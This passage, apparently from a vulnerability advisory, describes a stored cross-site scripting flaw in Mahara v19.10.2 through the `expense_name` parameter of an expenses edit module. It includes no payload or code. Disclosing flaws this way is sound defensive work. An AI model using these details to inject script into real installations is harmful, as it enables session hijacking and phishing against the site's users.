Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered in
the official Mahara v19.10.2 CMS web-application series.
The vulnerability allows remote attackers to inject own malicious script
codes with persistent attack vector to compromise browser
to web-application requests from the application-side.

The persistent vulnerability is located in the `expense_name` parameters
of the `/expenses/expenses/edit` module in the `index.php` file.
Remote attackers with low privileges are able to inject own malicious
persistent script code as expenses entry. The injected code can
be used to attack the frontend or backend of the web-application. The
request method to inject is POST and the attack vector is located
on the application-side. Entries of expenses can be reviewed in the
backend by higher privileged accounts as well.

Successful exploitation of the vulnerabilities results in session
hijacking, persistent phishing attacks, persistent external redirects to
malicious source and persistent manipulation of affected application
modules.
